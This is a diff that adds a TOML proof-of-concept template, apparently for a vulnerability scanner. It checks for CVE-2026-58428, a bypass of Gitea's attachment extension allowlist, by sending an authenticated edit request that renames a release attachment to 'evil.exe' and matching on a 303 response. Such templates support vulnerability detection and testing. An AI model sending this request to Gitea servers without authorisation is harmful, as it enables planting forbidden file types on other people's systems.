@@ -1,0 +1,33 @@
+[info]
+author = "ave"
+description = "验证Gitea网页发布编辑附件扩展名允许列表绕过漏洞：具写权限用户通过web发布编辑表单将允许扩展名附件重命名禁止扩展名时，服务端未执行upload.Verify校验。受影响版本为1.27.0以下所有Gitea版本。"
+id = "POC-AVE-2026-0666"
+name = "Gitea Release Attachment Extension Allowlist Bypass PoC"
+severity = "medium"
+tags = ["ave-2026-0666"]
+vuln_id = [
+    "CVE-2026-58428",
+    "AVE-2026-0666",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/releases/edit/{{tag}}"
+protocol = "http"
+
+[poc.requests.body]
+content = "tag_name={{tag}}&tag_target=main&title=edit&content=&attachment-edit-{{attachment_uuid}}=evil.exe"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+Cookie = "i_like_gitea={{session}}"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [303]
+type = "status"
